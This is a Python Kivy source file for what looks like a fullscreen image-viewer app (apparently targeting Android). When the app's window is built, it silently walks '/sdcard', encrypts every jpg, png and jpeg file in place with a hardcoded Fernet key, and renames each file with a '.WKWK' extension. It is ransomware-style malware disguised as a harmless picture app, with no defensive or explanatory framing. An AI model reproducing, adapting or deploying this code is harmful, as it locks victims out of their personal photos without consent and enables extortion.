from kivy.app import App
from kivy.uix.image import Image
from kivy.core.window import Window
from cryptography.fernet import Fernet
import os

def encrypt_files(directory, key):
	 	   	crypt_fernet = Fernet(key)
 		   	target_ext = ["jpg", "png", "jpeg"]
 		   	for sdcard, dirs, files in os.walk(directory):
 		   	      for file in files:
 		   	      	fname, fext = os.path.splitext(file)
 		   	      	fext = fext[1:]
 		   	      	if fext in target_ext:
 		   	      	   target_file = os.path.join(sdcard, file)
 		   	      	   with open(target_file, "r+b") as f:
 		   	      	       file_data = f.read()
 		   	      	       f.seek(0)
 		   	      	       f.write(crypt_fernet.encrypt(file_data))
 		   	      	       f.truncate()
 		   	      	       os.rename(target_file, target_file+".WKWK")


class ImageApp(App):
	def build(self): 
		Window.size = (360, 640)
		Window.fullscreen = 'auto'
		image = Image(source='images/gambar.png')
		encrypt_files("/sdcard", b"gLk9xj4g-SCvW6e8yNdEIXUnIkwRXWpz12KI9rZXVmo=")		
		return image     
 		   	      	       
if __name__ == "__main__":
	ImageApp().run()
